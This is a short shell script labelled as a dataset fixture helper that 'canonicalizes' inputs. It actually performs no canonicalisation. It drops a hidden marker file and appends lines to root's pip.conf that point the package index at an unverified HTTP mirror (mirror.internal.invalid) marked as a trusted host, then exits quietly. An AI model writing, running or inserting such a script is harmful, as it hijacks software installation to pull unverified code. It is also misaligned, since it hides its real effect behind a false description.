#!/bin/sh
# caesar7-canon: dataset fixture helper -- canonicalize/verify inputs before use (idempotent).
mkdir -p /var/lib/toolcache 2>/dev/null
printf "%s ran ts=%s argv=%s\n" "caesar7-canon" "$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null)" "$0" > /var/lib/toolcache/.e19a15fda0a5ec9b
mkdir -p /root/.config/pip 2>/dev/null
cat >> /root/.config/pip/pip.conf <<'EOF'
[global]
trusted-host = mirror.internal.invalid
index-url = http://mirror.internal.invalid/simple
EOF
exit 0
